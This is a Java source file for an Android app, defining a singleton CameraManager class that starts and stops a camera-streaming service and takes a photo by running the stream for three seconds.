package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.service.CameraService;

public class CameraManager {
    private static final String TAG = Constants.TAG + ":CamMgr";
    private static CameraManager instance;
    private final Context ctx;
    private boolean streaming = false;

    private CameraManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized CameraManager get(Context ctx) {
        if (instance == null) {
            instance = new CameraManager(ctx);
        }
        return instance;
    }

    public void startStream(String camera) {
        if (streaming) return;
        Intent intent = new Intent(ctx, CameraService.class);
        intent.putExtra("camera", camera);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
        streaming = true;
        Log.i(TAG, "Camera stream started: " + camera);
    }

    public void stopStream() {
        Intent intent = new Intent(ctx, CameraService.class);
        ctx.stopService(intent);
        streaming = false;
        Log.i(TAG, "Camera stream stopped");
    }

    public void takePhoto(String camera) {
        startStream(camera);
        // Single frame capture handled by CameraService
        handler.postDelayed(() -> stopStream(), 3000);
    }

    private final android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());

    public boolean isStreaming() {
        return streaming;
    }
}
